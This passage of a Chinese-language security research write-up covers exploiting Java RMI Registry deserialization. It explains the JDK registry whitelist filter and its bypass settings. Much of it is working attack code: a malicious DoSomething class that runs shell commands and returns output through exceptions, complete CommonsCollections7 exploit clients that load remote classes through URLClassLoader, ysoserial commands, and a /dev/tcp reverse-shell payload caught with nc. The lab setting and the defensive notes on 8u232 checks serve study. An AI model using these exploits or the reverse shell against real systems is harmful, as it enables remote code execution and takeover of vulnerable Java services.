        ObjectInputFilter.Status status = registryFilter.checkInput(filterInfo);
        if (status != ObjectInputFilter.Status.UNDECIDED) {
            // The Registry filter can override the built-in white-list
            return status;
        }
    }

    if (filterInfo.depth() > REGISTRY_MAX_DEPTH) {
        return ObjectInputFilter.Status.REJECTED;
    }
    Class<?> clazz = filterInfo.serialClass();
    if (clazz != null) {
        if (clazz.isArray()) {
            if (filterInfo.arrayLength() >= 0 && filterInfo.arrayLength() > REGISTRY_MAX_ARRAY_SIZE) {
                return ObjectInputFilter.Status.REJECTED;
            }
            do {
                // Arrays are allowed depending on the component type
                clazz = clazz.getComponentType();
            } while (clazz.isArray());
        }
        if (clazz.isPrimitive()) {
            // Arrays of primitives are allowed
            return ObjectInputFilter.Status.ALLOWED;
        }
/*
 * 8u121-b04，415行，白名单检查
 */
        if (String.class == clazz
                || java.lang.Number.class.isAssignableFrom(clazz)
                || Remote.class.isAssignableFrom(clazz)
                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
                || UnicastRef.class.isAssignableFrom(clazz)
                || RMIClientSocketFactory.class.isAssignableFrom(clazz)
                || RMIServerSocketFactory.class.isAssignableFrom(clazz)
                || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
                || java.rmi.server.UID.class.isAssignableFrom(clazz)) {
            return ObjectInputFilter.Status.ALLOWED;
        } else {
            return ObjectInputFilter.Status.REJECTED;
        }
    }
    return ObjectInputFilter.Status.UNDECIDED;
}
```

8u121-b03还没有RegistryImpl.registryFilter()。

12.2) sun.rmi.registry.registryFilter属性

如果特别想用8u232测试，只能动用sun.rmi.registry.registryFilter属性。参[60]，
有示例。

在test2目录执行:

java \
-Dsun.rmi.registry.registryFilter='javax.management.BadAttributeValueExpException;java.**;org.apache.**' \
-Djava.rmi.server.hostname=192.168.65.23 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

或者更简单的:

java \
-Dsun.rmi.registry.registryFilter='*' \
-Djava.rmi.server.hostname=192.168.65.23 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

registryFilter属性的语法比较奇怪，单个"*"表示全部允许，但为了表示允许以
"java."打头的类，要写成"java.**"。

在test3目录执行:

java \
-cp "commons-collections-3.1.jar:." \
EvilRMIRegistryClientWithBadAttributeValueExpException3 192.168.65.23 1099 \
"/bin/touch /tmp/scz_is_here"

12.3) java.security文件

关于registryFilter属性的语法，可以在JDK目录中找:

jre/lib/security/java.security

这个文件的注释部分详解了registryFilter属性的语法。

--------------------------------------------------------------------------
#
# Serialization process-wide filter
#
# A filter, if configured, is used by java.io.ObjectInputStream during
# deserialization to check the contents of the stream.
# A filter is configured as a sequence of patterns, each pattern is either
# matched against the name of a class in the stream or defines a limit.
# Patterns are separated by ";" (semicolon).
# Whitespace is significant and is considered part of the pattern.
#
# If the system property jdk.serialFilter is also specified, it supersedes
# the security property value defined here.
#
# If a pattern includes a "=", it sets a limit.
# If a limit appears more than once the last value is used.
# Limits are checked before classes regardless of the order in the sequence of patterns.
# If any of the limits are exceeded, the filter status is REJECTED.
#
#   maxdepth=value - the maximum depth of a graph
#   maxrefs=value  - the maximum number of internal references
#   maxbytes=value - the maximum number of bytes in the input stream
#   maxarray=value - the maximum array length allowed
#
# Other patterns, from left to right, match the class or package name as
# returned from Class.getName.
# If the class is an array type, the class or package to be matched is the element type.
# Arrays of any number of dimensions are treated the same as the element type.
# For example, a pattern of "!example.Foo", rejects creation of any instance or
# array of example.Foo.
#
# If the pattern starts with "!", the status is REJECTED if the remaining pattern
#   is matched; otherwise the status is ALLOWED if the pattern matches.
# If the pattern ends with ".**" it matches any class in the package and all subpackages.
# If the pattern ends with ".*" it matches any class in the package.
# If the pattern ends with "*", it matches any class with the pattern as a prefix.
# If the pattern is equal to the class name, it matches.
# Otherwise, the status is UNDECIDED.
#
# Primitive types are not configurable with this filter.
#
#jdk.serialFilter=pattern;pattern

#
# RMI Registry Serial Filter
#
# The filter pattern uses the same format as jdk.serialFilter.
# This filter can override the builtin filter if additional types need to be
# allowed or rejected from the RMI Registry or to decrease limits but not
# to increase limits.
# If the limits (maxdepth, maxrefs, or maxbytes) are exceeded, the object is rejected.
#
# The maxdepth of any array passed to the RMI Registry is set to
# 10000.  The maximum depth of the graph is set to 20.
# These limits can be reduced via the maxarray, maxdepth limits.
#
#sun.rmi.registry.registryFilter=pattern;pattern

#
# Array construction of any component type, including subarrays and arrays of
# primitives, are allowed unless the length is greater than the maxarray limit.
# The filter is applied to each array element.
#
# The built-in filter allows subclasses of allowed classes and
# can approximately be represented as the pattern:
#
#sun.rmi.registry.registryFilter=\
#    maxarray=1000000;\
#    maxdepth=20;\
#    java.lang.String;\
#    java.lang.Number;\
#    java.lang.reflect.Proxy;\
#    java.rmi.Remote;\
#    sun.rmi.server.UnicastRef;\
#    sun.rmi.server.RMIClientSocketFactory;\
#    sun.rmi.server.RMIServerSocketFactory;\
#    java.rmi.activation.ActivationID;\
#    java.rmi.server.UID
#
# RMI Distributed Garbage Collector (DGC) Serial Filter
#
# The filter pattern uses the same format as jdk.serialFilter.
# This filter can override the builtin filter if additional types need to be
# allowed or rejected from the RMI DGC.
#
# The builtin DGC filter can approximately be represented as the filter pattern:
#
#sun.rmi.transport.dgcFilter=\
#    java.rmi.server.ObjID;\
#    java.rmi.server.UID;\
#    java.rmi.dgc.VMID;\
#    java.rmi.dgc.Lease;\
#    maxdepth=5;maxarray=10000
--------------------------------------------------------------------------

13) 为什么CommonsCollections5攻击JDK自带rmiregistry失败

参看:

《Java RMI入门》
http://scz.617.cn/network/202002221000.txt

在"9.1.1) inside rmiregistry"小节讲过，"rmiregistry 1099"相当于
"java sun.rmi.registry.RegistryImpl 1099"。

起初研究"攻击RMI Registry"，没有专门写服务端、客户端，是这样测试的:

java_8_40 \
-cp "commons-collections-3.1.jar" \
sun.rmi.registry.RegistryImpl 1099

java \
-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
ysoserial.exploit.RMIRegistryExploit 192.168.65.23 1099 CommonsCollections5 \
"/bin/touch /tmp/scz_is_here"

想法很美好，服务端、客户端都是现成的。但客户端得到异常:

java.security.AccessControlException: access denied ("java.lang.RuntimePermission" "accessClassInPackage.sun.reflect.annotation")
        at java.security.AccessControlContext.checkPermission(AccessControlContext.java:457)
        at java.security.AccessControlContext.checkPermission2(AccessControlContext.java:523)
        at java.security.AccessControlContext.checkPermission(AccessControlContext.java:466)
        at java.security.AccessController.checkPermission(AccessController.java:884)
        at java.lang.SecurityManager.checkPermission(SecurityManager.java:549)
        at java.lang.SecurityManager.checkPackageAccess(SecurityManager.java:1564)
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:311)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:411)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:411)
        at sun.rmi.server.LoaderHandler$Loader.loadClass(LoaderHandler.java:1207)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:357)
        at java.lang.Class.forName0(Native Method)
        at java.lang.Class.forName(Class.java:348)
        at sun.rmi.server.LoaderHandler.loadClassForName(LoaderHandler.java:1221)
        at sun.rmi.server.LoaderHandler.loadClass(LoaderHandler.java:453)
        at sun.rmi.server.LoaderHandler.loadClass(LoaderHandler.java:186)
        at java.rmi.server.RMIClassLoader$2.loadClass(RMIClassLoader.java:637)
        at java.rmi.server.RMIClassLoader.loadClass(RMIClassLoader.java:264)
        at sun.rmi.server.MarshalInputStream.resolveClass(MarshalInputStream.java:214)
        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1613)
        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1518)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1774)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1993)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1918)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371)
        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)
        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:410)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:268)
        at sun.rmi.transport.Transport$1.run(Transport.java:200)
        at sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78(TCPTransport.java:683)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1/1401807365.run(Unknown Source)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at java.lang.Thread.run(Thread.java:745)
        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:303)
        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:279)
        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:375)
        at sun.rmi.registry.RegistryImpl_Stub.bind(RegistryImpl_Stub.java:73)
        at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:77)
        at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:71)
        at ysoserial.secmgr.ExecCheckingSecurityManager.callWrapped(ExecCheckingSecurityManager.java:72)
        at ysoserial.exploit.RMIRegistryExploit.exploit(RMIRegistryExploit.java:71)
        at ysoserial.exploit.RMIRegistryExploit.main(RMIRegistryExploit.java:65)

看了一眼sun.rmi.registry.RegistryImpl.main()，一上来就安装SecurityManager。
为了减少干挠，弄个all.policy:

--------------------------------------------------------------------------
grant
{
permission java.security.AllPermission;
};
--------------------------------------------------------------------------

换个方式启动服务端:

java_8_40 \
-cp "commons-collections-3.1.jar" \
-Djava.security.policy=all.policy \
sun.rmi.registry.RegistryImpl 1099

java \
-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
ysoserial.exploit.RMIRegistryExploit 192.168.65.23 1099 CommonsCollections5 \
"/bin/touch /tmp/scz_is_here"

客户端居然无声无息结束，恶意命令未被执行。调试服务端:

java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar" \
-Djava.security.policy=all.policy \
sun.rmi.registry.RegistryImpl 1099

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in javax.management.BadAttributeValueExpException.readObject

这个断点有命中，说明基本反序列过程已经完成。单步跟踪这个函数，发现如果有
SecurityManager，CommonsCollections5流程无法到达TiedMapEntry.toString()。

参看:

http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u40-b26/src/share/classes/javax/management/BadAttributeValueExpException.java

```java
/*
 * 8u40
 *
 * javax.management.BadAttributeValueExpException.readObject
 */
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField gf = ois.readFields();
    Object valObj = gf.get("val", null);

    if (valObj == null) {
        val = null;
    } else if (valObj instanceof String) {
        val= valObj;
/*
 * 78行，如果有SecurityManager，CommonsCollections5攻击流程不会去86行。
 */
    } else if (System.getSecurityManager() == null
            || valObj instanceof Long
            || valObj instanceof Integer
            || valObj instanceof Float
            || valObj instanceof Double
            || valObj instanceof Byte
            || valObj instanceof Short
            || valObj instanceof Boolean) {
/*
 * 86行，看简化版调用关系，TiedMapEntry.toString()由此进入
 */
        val = valObj.toString();
    } else { // the serialized object is from a version without JDK-8019292 fix
        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
    }
}
```

客户端换用CommonsCollections6就可以得手。不过现实世界中，假设用rmiregistry
提供周知端口，不可能带着all.policy启动，此时CommonsCollections1至7全歇菜。

这一小节没啥意思，就是记录一下中间碰到的各种坑，这是其中一个坑。从坑中爬出
来后才自己写的RMIRegistryServer.java。人生就是一个接一个的坑，区别只有坑深
坑浅，而非有坑无坑。

14) 基于报错回显的PoC

之前所有的PoC都是盲执行，拿不到命令执行结果，没有回显。参[59]，文中提供了
一个基于报错回显的例子。参看:

《Java RMI入门(5)》
http://scz.617.cn/network/202003241127.txt

8.6小节介绍利用java.net.URLClassLoader干复杂的事。

14.1) DoSomething.java

```java
/*
 * javac -encoding GBK -g DoSomething.java
 */
import java.io.*;

public class DoSomething
{
    public DoSomething ( Object[] argv ) throws Exception
    {
        Operator( argv );
    }

    /*
     * 我们是正经程序员，不是小黑黑，就算是写个PoC，也不能丢老司机的脸
     */
    public static void Operator ( Object[] argv ) throws Exception
    {
        int     opnum   = Integer.parseInt( ( String )argv[0] );
        String  cmd;

        /*
         * Java没有函数指针的概念，本想弄个函数指针数组来着。参看:
         *
         * Array of function pointers in Java - [2010-05-02]
         * https://stackoverflow.com/questions/2752192/array-of-function-pointers-in-java
         *
         * 还是switch吧，这样写只是为了将来的功能扩展及测试需要。
         */
        switch ( opnum )
        {
        case 0 :
            cmd = ( String )argv[1];
            Operator_0( cmd );
            break;
        case 1 :
            cmd = ( String )argv[1];
            Operator_1( cmd );
            break;
        default:
            Operator_unknown();
            break;
        }
    }

    private static void Operator_0 ( String cmd ) throws Exception
    {
        Runtime.getRuntime().exec( new String[] { "/bin/sh", "-c", cmd } );
    }

    private static void Operator_1 ( String cmd ) throws Exception
    {
        String  ret = PrivateExec( cmd );
        //
        // System.out.print( ret );
        //
        /*
         * 通过异常向客户端传递信息
         */
        throw new InvalidClassException( "\n[\n" + ret + "]\n" );
    }

    private static void Operator_unknown () throws Exception
    {
        throw new InvalidClassException( "\n[\nUnknown opnum\n]\n" );
    }

    /*
     * 参看:
     *
     * https://stackoverflow.com/questions/5711084/java-runtime-getruntime-getting-output-from-executing-a-command-line-program
     *
     * 这个贴子的回答及讨论都应该看一下，从下往上看
     */
    private static String PrivateExec ( String cmd ) throws IOException
    {
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html
         *
         * 官网页面中有个例子
         */
        ProcessBuilder  pb  = new ProcessBuilder( "/bin/sh", "-c", cmd ).redirectErrorStream( true );
        Process         p   = pb.start();
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/lang/StringBuilder.html
         */
        StringBuilder   ret = new StringBuilder( 256 );
        BufferedReader  in  = new BufferedReader( new InputStreamReader( p.getInputStream() ) );
        String          line;

        while ( true )
        {
            line    = in.readLine();
            if ( line == null )
            {
                break;
            }
            ret.append( line ).append( "\n" );
        }
        return( ret.toString() );
    }

    /*
     * https://docs.oracle.com/javase/8/docs/api/java/lang/Exception.html
     * https://docs.oracle.com/javase/8/docs/api/java/lang/Throwable.html
     *
     * 参看:
     *
     * https://stackoverflow.com/questions/17747175/how-can-i-loop-through-exception-getcause-to-find-root-cause-with-detail-messa
     *
     * 这个贴子的回答及讨论都应该看一下，从下往上看
     */
    private static Throwable PrivateGetRootCause ( Throwable e )
    {
        Throwable cause = null;
        Throwable ret   = e;

        while ( null != ( cause = ret.getCause() ) && ( ret != cause ) )
        {
            ret = cause;
        }
        return ret;
    }

    /*
     * 方便测试而存在
     */
    public static void main ( String[] argv ) throws Exception
    {
        try
        {
            Operator( argv );
        }
        catch ( Exception e )
        {
            System.out.print( PrivateGetRootCause( e ).getLocalizedMessage() );
        }
    }
}
```

DoSomething是恶意类，可以通过构造函数或成员函数Operator()执行恶意代码。通
过opnum机制保持接口向后兼容性，将来扩展其他功能时，不影响之前的opnum。此为
框架示例代码，未做容错处理。

$ java DoSomething 1 "uname -a"
$ java DoSomething 1 "ifconfig -a"
$ java DoSomething 1 "ps -f -o pid,user,args"
$ java DoSomething 1 "ps -ef"
$ java DoSomething 1 "echo any > /tmp/some"
$ java DoSomething 1 "ls -l nonexist"

14.2) RMIRegistryExploitWithHashtable.java

```java
/*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar:." RMIRegistryExploitWithHashtable.java
 */
import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.rmi.registry.*;
import java.net.URL;
import java.net.URLClassLoader;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;

/*
 * 根据EvilURLClassLoaderWithConcurrentHashMap.java、
 * LazyMapExecWithHashtable.java、
 * EvilRMIRegistryClientWithBadAttributeValueExpException3.java修改而来，
 * 用到CommonsCollections7。
 */
public class RMIRegistryExploitWithHashtable
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          addr        = argv[0];
        int             port        = Integer.parseInt( argv[1] );
        String          evilurl     = argv[2];
        String          evilclass   = argv[3];
        String[]        evilparam   = Arrays.copyOfRange
        (
            argv,
            4,
            argv.length
        );
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( URLClassLoader.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "newInstance",
                    new Class[]
                    {
                        URL[].class
                    }
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[]
                    {
                        new URL[]
                        {
                            new URL( evilurl )
                        }
                    }
                }
            ),
            new InvokerTransformer
            (
                "loadClass",
                new Class[]
                {
                    String.class
                },
                new Object[]
                {
                    evilclass
                }
            ),
            // new InvokerTransformer
            // (
            //     "getDeclaredConstructor",
            //     new Class[]
            //     {
            //         Class[].class
            //     },
            //     new Object[]
            //     {
            //         new Class[]
            //         {
            //             Object[].class
            //         }
            //     }
            // ),
            // new InvokerTransformer
            // (
            //     "newInstance",
            //     new Class[]
            //     {
            //         Object[].class
            //     },
            //     new Object[]
            //     {
            //         new Object[]
            //         {
            //             evilparam
            //         }
            //     }
            // )
            /*
             * 故意换种方式演示
             */
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "Operator",
                    new Class[]
                    {
                        Object[].class
                    }
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[]
                    {
                        evilparam
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( new Transformer[0] );
        Map             normalMap_0 = new HashMap();
        Map             normalMap_1 = new HashMap();
        Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );
        Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );
        lazyMap_0.put( "scz", "same" );
        lazyMap_1.put( "tDz", "same" );
        Hashtable       ht          = new Hashtable();
        ht.put( lazyMap_0, "value_0" );
        ht.put( lazyMap_1, "value_1" );
        lazyMap_1.remove( "scz" );
        Field           f           = ChainedTransformer.class.getDeclaredField( "iTransformers" );
        f.setAccessible( true );
        f.set( tchain, tarray );
        /*
         * 前面在准备待序列化数据，后面是一种另类的序列化过程
         */
        String          name        = "anything";
        GeneralInvocationHandler3
                        ih          = new GeneralInvocationHandler3( ht );
        Remote          remoteProxy = ( Remote )Proxy.newProxyInstance
        (
            Remote.class.getClassLoader(),
            new  Class[] { Remote.class },
            ih
        );
        Registry        r           = LocateRegistry.getRegistry( addr, port );
        r.rebind( name, remoteProxy );
    }
}
```

用到CommonsCollections7，用到URLClassLoader，需要和DoSomething配合使用。故
意演示调用DoSomething中的恶意成员函数Operator()，而不是调用恶意构造函数。
没啥本质区别，不过用恶意构造函数的话，兼容性更广。

14.3) RMIRegistryExploitWithHashtable2.java

```java
/*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar:." RMIRegistryExploitWithHashtable2.java
 */
import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.rmi.registry.*;
import java.net.URL;
import java.net.URLClassLoader;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;

/*
 * 从RMIRegistryExploitWithHashtable.java修改而来，优化输出
 */
public class RMIRegistryExploitWithHashtable2
{
    private static Throwable PrivateGetRootCause ( Throwable e )
    {
        Throwable cause = null;
        Throwable ret   = e;

        while ( null != ( cause = ret.getCause() ) && ( ret != cause ) )
        {
            ret = cause;
        }
        return ret;
    }

    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          addr        = argv[0];
        int             port        = Integer.parseInt( argv[1] );
        String          evilurl     = argv[2];
        String          evilclass   = argv[3];
        String[]        evilparam   = Arrays.copyOfRange
        (
            argv,
            4,
            argv.length
        );
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( URLClassLoader.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "newInstance",
                    new Class[]
                    {
                        URL[].class
                    }
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[]
                    {
                        new URL[]
                        {
                            new URL( evilurl )
                        }
                    }
                }
            ),
            new InvokerTransformer
            (
                "loadClass",
                new Class[]
                {
                    String.class
                },
                new Object[]
                {
                    evilclass
                }
            ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "Operator",
                    new Class[]
                    {
                        Object[].class
                    }
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[]
                    {
                        evilparam
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( new Transformer[0] );
        Map             normalMap_0 = new HashMap();
        Map             normalMap_1 = new HashMap();
        Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );
        Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );
        lazyMap_0.put( "scz", "same" );
        lazyMap_1.put( "tDz", "same" );
        Hashtable       ht          = new Hashtable();
        ht.put( lazyMap_0, "value_0" );
        ht.put( lazyMap_1, "value_1" );
        lazyMap_1.remove( "scz" );
        Field           f           = ChainedTransformer.class.getDeclaredField( "iTransformers" );
        f.setAccessible( true );
        f.set( tchain, tarray );
        String          name        = "anything";
        GeneralInvocationHandler3
                        ih          = new GeneralInvocationHandler3( ht );
        Remote          remoteProxy = ( Remote )Proxy.newProxyInstance
        (
            Remote.class.getClassLoader(),
            new  Class[] { Remote.class },
            ih
        );
        Registry        r           = LocateRegistry.getRegistry( addr, port );
        try
        {
            r.rebind( name, remoteProxy );
        }
        catch ( Exception e )
        {
            System.out.print( PrivateGetRootCause( e ).getLocalizedMessage() );
        }
    }
}
```

这个版本自己处理了异常，优化输出，不再显示调用栈回溯信息。

14.4) 测试

假设目录结构是:

.
|
+---test0
|
+---test1
|       DoSomething.class
|
+---test2
|       RMIRegistryServer.class
|       all.policy
|       commons-collections-3.1.jar
|
\---test3
        RMIRegistryExploitWithHashtable.class
        RMIRegistryExploitWithHashtable2.class
        GeneralInvocationHandler3.class
        commons-collections-3.1.jar

14.4.1) 测试1

在test1目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test2目录执行:

java_8_40 \
-Djava.rmi.server.hostname=192.168.65.23 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

在test3目录执行:

java \
-cp "commons-collections-3.1.jar:." \
RMIRegistryExploitWithHashtable2 192.168.65.23 1099 \
http://192.168.65.23:8080/ DoSomething 1 \
"ps -f -o pid,user,args"

在客户端看到类似这样的输出:

[
   PID USER     COMMAND
 19439 scz      -bash
 25558 scz       \_ java -cp commons-collections-3.1.jar:. RMIRegistryExploitWithHashtable2 192.168.65.23 1099 http://192.168.65.23:8080/ DoSomething 1 ps -f -o pid,user,args
  5238 scz      -bash
 24732 scz       \_ java_8_40 -Djava.rmi.server.hostname=192.168.65.23 -cp commons-collections-3.1.jar:. RMIRegistryServer 1099
 25568 scz           \_ ps -f -o pid,user,args
  3594 scz      -bash
 24731 scz       \_ python3 -m http.server -b 192.168.65.23 8080
]

在test3目录执行:

java \
-cp "commons-collections-3.1.jar:." \
RMIRegistryExploitWithHashtable2 192.168.65.23 1099 \
http://192.168.65.23:8080/ DoSomething 1 \
"ls -l nonexist"

在客户端看到类似这样的输出:

[
ls: cannot access nonexist: No such file or directory
]

说明stderr确实被转向到stdout了。

如果用8u232启动RMIRegistryServer，客户端看到的是:

filter status: REJECTED

14.4.2) 测试2(connect shell)

在test0目录执行:

nc -l -p 7474

在test1目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test2目录执行:

java_8_40 \
-Djava.rmi.server.hostname=192.168.65.23 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

在test3目录执行:

java \
-cp "commons-collections-3.1.jar:." \
RMIRegistryExploitWithHashtable2 192.168.65.23 1099 \
http://192.168.65.23:8080/ DoSomething 1 \
"/bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1"

回到前面那个nc，已经得到一个shell，其uid对应RMIRegistryServer进程的euid。

14.4.3) 测试3(rmiregistry)

在test1目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test2目录执行:

java_8_40 \
-cp "commons-collections-3.1.jar" \
-Djava.security.policy=all.policy \
sun.rmi.registry.RegistryImpl 1099

在test3目录执行:

java \
-cp "commons-collections-3.1.jar:." \
RMIRegistryExploitWithHashtable2 192.168.65.23 1099 \
http://192.168.65.23:8080/ DoSomething 1 \
"ps -f -o pid,user,args"

14.4.4) 远程测试

在192.168.65.23上:

$ ls -l
RMIRegistryServer.class
commons-collections-3.1.jar

java \
-Djava.rmi.server.hostname=192.168.65.20 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

用8u232启动RMIRegistryServer，此时先触发RegistryImpl.checkAccess()。

在192.168.65.20上:

$ ls -1
RMIRegistryExploitWithHashtable.class
RMIRegistryExploitWithHashtable2.class
GeneralInvocationHandler3.class
commons-collections-3.1.jar

java_8_232 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryExploitWithHashtable2 192.168.65.23 1099 \
http://192.168.65.23:8080/ DoSomething 1 \
"echo hello"

客户端看到的是:

Registry.rebind disallowed; origin /192.168.65.20 is non-local host

而不是:

filter status: REJECTED

8u232将RegistryImpl.checkAccess()前置，比白名单机制强多了。

☆ 参考资源

[57]
    RMI反序列化漏洞分析 - 合天智汇 [2019-08-16]
    https://www.jianshu.com/p/1a6f32f7bafc
    https://baijiahao.baidu.com/s?id=1641986524548861404

[59]
    JAVA RMI反序列化流程原理分析 - orich1 [2018-03-28]
    https://xz.aliyun.com/t/2223
    (有个报错回显的例子，在文中搜do_exec)

[60]
    Relax RMI Registry Serial Filter to allow arrays of any type - [2017-07-28]
    https://bugs.openjdk.java.net/browse/JDK-8185539
    (这有sun.rmi.registry.registryFilter的示例)

    Serialization Filtering
    https://docs.oracle.com/javase/10/core/serialization-filtering1.htm